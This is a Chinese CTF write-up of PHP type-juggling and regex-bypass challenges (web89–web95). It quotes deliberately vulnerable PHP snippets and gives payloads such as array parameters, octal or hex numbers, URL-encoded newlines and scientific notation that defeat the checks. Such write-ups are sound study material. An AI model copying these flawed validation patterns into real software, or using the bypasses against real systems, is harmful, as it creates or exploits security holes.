# php的特性

---

```toc
```

## web89

>  preg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1

```php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

*构造payload：*`?num[]=1`

得到flag.



## 😍web90

> 注意是“===”的绕过
>
> intval($var,$base)，其中var必填，base可选，这里base=0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。 这里===表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。 paylod：num=010574或num=0x117c

### intval()函数

![image-20240531165527229](https://gitee.com/bx33661/image/raw/master/path/image-20240531165527229.png)

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```



### 方法

- `4476a`
- `4476.0`
- `?num=0x117c`
- `?num=010574`

---

## web91

```php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

> 注意两个正则表达式的区别:/^php$/im
> ^ 表示的是开头
> $ 表示的是结尾
> i 表示的是忽略大小写
> m表示的是多行匹配
>
> 所以换一行填写php即可得到flag

*构造payload：* `/?cmd=1%0Aphp`------`%0A`是url的换行符

得到flag

## web92

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

==与上面那个类似，不过使用的是“弱比较”，我们可以使用科学计数法==

*payload：* `4476e1`



## web93

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

根据正则表达式我们可以判断不能继续使用科学计数法了，采用进制转化

010574，4476.1



## web94

> 综合分析：4476.0

## web95

> ?num=+010574 （空格代替+，也可以）
> ?num=%2b010574